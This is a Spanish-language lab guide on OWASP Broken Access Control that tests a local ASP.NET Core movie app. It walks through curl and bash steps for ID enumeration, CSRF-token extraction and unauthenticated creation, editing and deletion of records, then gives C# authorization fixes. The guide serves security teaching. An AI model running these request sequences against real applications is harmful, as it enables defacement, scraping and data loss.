# A1:2021 - Broken Access Control (Control de Acceso Roto)

👉 [Ver resultados y evidencias de las pruebas (capturas)](Resultados.md)

---

## 📝 Guía práctica para evaluar Broken Access Control

En este laboratorio te muestro cómo puedes identificar y explotar problemas de control de acceso en una aplicación web, usando ejemplos reales y comandos que puedes adaptar a cualquier proyecto. La idea es que no solo sigas los pasos, sino que entiendas el porqué de cada prueba y cómo podrías aplicarla en otros contextos.

### ¿Por qué es importante?

El control de acceso es la barrera que separa a los usuarios legítimos de los recursos que no deberían ver o modificar. Si está mal implementado, cualquiera podría ver, cambiar o borrar información sensible. Aquí aprenderás a pensar como un atacante, pero también como alguien que quiere proteger su aplicación.

---

## 🎯 ¿Qué vamos a hacer?

1. Probar si es posible ver recursos sin permisos (por ejemplo, detalles de películas)
2. Intentar crear, modificar o eliminar información sin autenticación
3. Automatizar ataques para descubrir vulnerabilidades más rápido
4. Analizar los resultados y pensar en soluciones

No necesitas ser experto en seguridad: solo curiosidad, ganas de experimentar y acceso a la terminal.

---

## ✅ Prueba 1: Enumeración de recursos (Insecure Direct Object Reference - IDOR)

### 📡 Request básico - Ver detalles de una película

```bash
curl -i http://localhost:5247/Peliculas/Details/1
```

**¿Qué hace este comando?**

- `-i`: Incluye los headers HTTP en la respuesta
- `GET /Peliculas/Details/1`: Solicita los detalles de la película con ID=1

**Respuesta esperada:**

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Tue, 26 Nov 2025 10:30:00 GMT
Server: Kestrel
Transfer-Encoding: chunked

<!DOCTYPE html>
<html>
<head>
    <title>Details - Película</title>
...
[HTML completo de la página]
```

**Análisis:**

- ✅ **Status 200**: La petición fue exitosa
- ✅ **Content-Type: text/html**: El servidor devuelve HTML (una vista Razor)
- ✅ **Server: Kestrel**: Es el servidor web de ASP.NET Core

---

### 📡 Enumeración sistemática de IDs

```bash
# Probar varios IDs consecutivos
for i in {1..10}; do
  echo "Probando ID: $i"
  curl -s -o /dev/null -w "ID $i: HTTP %{http_code}\n" http://localhost:5247/Peliculas/Details/$i
done
```

**¿Qué hace?**

- `for i in {1..10}`: Loop del 1 al 10
- `-s`: Modo silencioso (no muestra progreso)
- `-o /dev/null`: Descarta el HTML (solo queremos el código HTTP)
- `-w "..."`: Formato personalizado de salida
- `%{http_code}`: Muestra el código HTTP de respuesta

**Salida esperada:**

```
ID 1: HTTP 200
ID 2: HTTP 200
ID 3: HTTP 404
ID 4: HTTP 200
ID 5: HTTP 404
...
```

**Análisis:**

- ❌ **VULNERABILIDAD**: Puedes enumerar todas las películas que existen (200 = existe, 404 = no existe)
- 🔴 **Impacto**: Un atacante puede descubrir todos los IDs válidos y acceder a todos los recursos
- ✅ **Mitigación**: Implementar autenticación y validar que el usuario tiene permiso para ver ese recurso

---

### 📡 Intentar acceder a recursos que no existen

```bash
curl -i http://localhost:5247/Peliculas/Details/99999
```

**Respuesta esperada:**

```
HTTP/1.1 404 Not Found
Content-Type: text/html; charset=utf-8
...
```

**Análisis:**

- ✅ El servidor maneja correctamente recursos inexistentes (404)
- ⚠️ Verifica si el mensaje de error revela información sensible (nombres de tablas, rutas del servidor, etc.)

---

## ✅ Prueba 2: Acceso sin autenticación a operaciones críticas

### 📡 Acceder al formulario de creación

```bash
curl -i http://localhost:5247/Peliculas/Create
```

**¿Qué devuelve?**

- HTML del formulario con los campos: Título, Descripción, Fecha, etc.
- Elementos `<input>`, `<select>` para ingresar datos
- Token anti-CSRF en un campo oculto: `<input name="__RequestVerificationToken" ...>`

**Guardar la respuesta completa:**

```bash
curl -s http://localhost:5247/Peliculas/Create > create_form.html
```

Ahora abre `create_form.html` en un editor y busca:

```html
<input name="__RequestVerificationToken" type="hidden" value="CfDJ8..." />
```

**Análisis:**

- ❌ **VULNERABILIDAD**: Cualquiera puede acceder al formulario de creación
- ✅ **Protección parcial**: Usa tokens CSRF (previene ataques de falsificación)
- 🔴 **Impacto Alto**: Sin login, cualquier persona puede crear películas

---

### 📡 Intentar enviar un POST sin token CSRF

```bash
curl -X POST http://localhost:5247/Peliculas/Create \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "Titulo=Pelicula Hackeada&Descripcion=Test&FechaLanzamiento=2025-01-01&GeneroId=1&DirectorId=1" \
  -i
```

**¿Qué hace?**

- `-X POST`: Envía una petición POST (no GET)
- `-H "Content-Type: ..."`: Indica que enviamos datos de formulario
- `-d "..."`: Los datos del formulario (key=value&key=value)
- `-i`: Muestra los headers de respuesta

**Respuesta esperada:**

```
HTTP/1.1 400 Bad Request
Content-Type: text/html; charset=utf-8

...
<title>Bad Request</title>
...
Antiforgery token validation failed
```

**Análisis:**

- ✅ **Protección**: El servidor rechaza la petición sin token CSRF
- 🔴 **Pero...**: Si obtenemos el token, SÍ podemos crear la película

---

### 📡 Enviar POST con token CSRF válido

**Paso 1:** Extraer el token del formulario

```bash
# Obtener el formulario y extraer el token
TOKEN=$(curl -s http://localhost:5247/Peliculas/Create | grep -oP '__RequestVerificationToken.*?value="\K[^"]+')
echo "Token CSRF: $TOKEN"
```

**Paso 2:** Obtener las cookies de sesión

```bash
# Guardar las cookies
curl -c cookies.txt http://localhost:5247/Peliculas/Create > /dev/null
cat cookies.txt
```

**Paso 3:** Enviar POST completo con token y cookies

```bash
curl -X POST http://localhost:5247/Peliculas/Create \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b cookies.txt \
  -d "__RequestVerificationToken=$TOKEN" \
  -d "Titulo=Pelicula desde cURL" \
  -d "Descripcion=Esta pelicula fue creada con curl" \
  -d "FechaLanzamiento=2025-11-26" \
  -d "Duracion=120" \
  -d "GeneroId=1" \
  -d "DirectorId=1" \
  -L -i
```

**¿Qué hace cada parámetro?**

- `-b cookies.txt`: Envía las cookies guardadas (sesión)
- `-d "__RequestVerificationToken=$TOKEN"`: Incluye el token CSRF
- `-d "Campo=Valor"`: Cada campo del formulario
- `-L`: Sigue redirecciones (después de crear, redirige a Index)
- `-i`: Muestra headers

**Respuesta esperada:**

```
HTTP/1.1 302 Found
Location: /Peliculas

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...
[HTML de la página Index con la nueva película]
```

**Análisis:**

- ❌ **VULNERABILIDAD CRÍTICA**: Aunque usa CSRF, NO hay autenticación
- 🔴 **Impacto**: Cualquiera puede crear, editar, eliminar películas sin ser usuario
- 🔴 **En producción**: Un bot puede automatizar esto y llenar la BD de basura

---

### 📡 Verificar que la película se creó

```bash
curl -s http://localhost:5247/Peliculas | grep "Pelicula desde cURL"
```

Si ves el texto, **la película se creó exitosamente** sin ninguna autenticación.

---

## ✅ Prueba 3: Manipulación y eliminación de recursos

### 📡 Acceder al formulario de edición

```bash
curl -i http://localhost:5247/Peliculas/Edit/1
```

**Análisis:**

- ❌ Si devuelve 200 y el formulario → **Vulnerabilidad**: Cualquiera puede editar
- ✅ Si devuelve 401/403 → Requiere autenticación

---

### 📡 Modificar una película existente

```bash
# 1. Obtener token y cookies
TOKEN=$(curl -s -c edit_cookies.txt http://localhost:5247/Peliculas/Edit/1 | grep -oP '__RequestVerificationToken.*?value="\K[^"]+')

# 2. Enviar cambios
curl -X POST http://localhost:5247/Peliculas/Edit/1 \
  -b edit_cookies.txt \
  -d "__RequestVerificationToken=$TOKEN" \
  -d "Id=1" \
  -d "Titulo=TITULO MODIFICADO POR ATACANTE" \
  -d "Descripcion=Pwned" \
  -d "FechaLanzamiento=2025-01-01" \
  -d "Duracion=60" \
  -d "GeneroId=1" \
  -d "DirectorId=1" \
  -L -i
```

**Análisis:**

- ❌ **VULNERABILIDAD CRÍTICA**: Cualquiera puede modificar cualquier película
- 🔴 **Impacto**: Desfiguración del sitio (defacement), modificación de datos

---

### 📡 Eliminar una película

```bash
# 1. Obtener token del formulario Delete
TOKEN=$(curl -s -c del_cookies.txt http://localhost:5247/Peliculas/Delete/1 | grep -oP '__RequestVerificationToken.*?value="\K[^"]+')

# 2. Confirmar eliminación
curl -X POST http://localhost:5247/Peliculas/Delete/1 \
  -b del_cookies.txt \
  -d "__RequestVerificationToken=$TOKEN" \
  -L -i
```

**Respuesta esperada:**

```
HTTP/1.1 302 Found
Location: /Peliculas

HTTP/1.1 200 OK
...
[La película ya no aparece en la lista]
```

**Análisis:**

- ❌ **VULNERABILIDAD CRÍTICA**: Cualquiera puede eliminar cualquier película
- 🔴 **Impacto**: Pérdida de datos, denegación de servicio

---

## ✅ Prueba 4: Ataque automatizado de enumeración

### 📡 Script para extraer todos los títulos de películas

```bash
# Crear un script de enumeración
for i in {1..100}; do
  TITLE=$(curl -s http://localhost:5247/Peliculas/Details/$i | grep -oP '<h2>\K[^<]+' | head -1)
  if [ ! -z "$TITLE" ]; then
    echo "ID $i: $TITLE"
  fi
done
```

**¿Qué hace?**

- Prueba IDs del 1 al 100
- Extrae el título de cada película (`<h2>Título</h2>`)
- Solo muestra los que existen

**Salida esperada:**

```
ID 1: Inception
ID 2: The Matrix
ID 5: Interstellar
...
```

**Análisis:**

- ❌ **VULNERABILIDAD**: Información sensible expuesta sin autenticación
- 🔴 **Impacto**: Un atacante puede hacer scraping de toda la BD

---

## 📊 Resumen A1 - Broken Access Control

| Prueba                      | Comando              | Resultado        | Severidad      |
| --------------------------- | -------------------- | ---------------- | -------------- |
| Ver detalles sin login      | `curl .../Details/1` | ✅ 200 OK        | 🟡 Media       |
| Enumeración de IDs          | Loop con curl        | ✅ Enumera todos | 🔴 Alta        |
| Acceso a formulario Create  | `curl .../Create`    | ✅ 200 OK        | 🔴 Alta        |
| Crear película sin login    | POST con CSRF        | ✅ Creada        | 🔴 **CRÍTICA** |
| Editar película sin login   | POST .../Edit/1      | ✅ Editada       | 🔴 **CRÍTICA** |
| Eliminar película sin login | POST .../Delete/1    | ✅ Eliminada     | 🔴 **CRÍTICA** |

**Conclusión:** La aplicación tiene **BROKEN ACCESS CONTROL CRÍTICO** - No hay autenticación ni autorización.

---

## 🛠️ Soluciones Recomendadas

### Implementar autenticación

```csharp
// En los controladores
[Authorize] // Requiere autenticación para todas las acciones
public class PeliculasController : Controller
{
    [AllowAnonymous] // Solo Index y Details son públicos
    public async Task<IActionResult> Index() { ... }

    [AllowAnonymous]
    public async Task<IActionResult> Details(int? id) { ... }

    // Create, Edit, Delete requieren login (por el [Authorize] de la clase)
}
```

### Implementar control de roles

```csharp
[Authorize(Roles = "Admin")] // Solo admins pueden eliminar
public async Task<IActionResult> Delete(int id) { ... }

[Authorize(Roles = "Admin,Editor")] // Admins y editores pueden editar
public async Task<IActionResult> Edit(int id) { ... }
```

### Validar propiedad de recursos

```csharp
[Authorize]
public async Task<IActionResult> Edit(int id)
{
    var pelicula = await _context.Peliculas.FindAsync(id);

    // Verificar que el usuario actual es el creador
    if (pelicula.CreadorId != User.FindFirstValue(ClaimTypes.NameIdentifier))
    {
        return Forbid(); // 403 Forbidden
    }

    return View(pelicula);
}
```
